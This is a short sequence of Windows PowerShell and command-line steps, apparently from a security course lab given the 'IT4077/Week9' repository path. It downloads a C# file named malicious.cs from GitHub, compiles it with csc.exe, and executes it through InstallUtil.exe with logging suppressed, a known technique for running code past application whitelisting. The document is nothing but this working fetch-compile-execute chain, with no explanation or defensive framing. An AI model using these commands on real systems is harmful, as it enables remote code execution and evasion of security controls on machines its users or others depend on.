$wc = New-Object Net.WebClient
$wc.DownloadFile("https://raw.githubusercontent.com/EvaStanAccount/IT4077/Main/Week9/malicious.cs","C:\Users\Administrator\malicious.cs")

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /platform:x64 /out:C:\Users\Administrator\malicious.exe C:\Users\Administrator\malicious.cs

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\Administrator\malicious.exe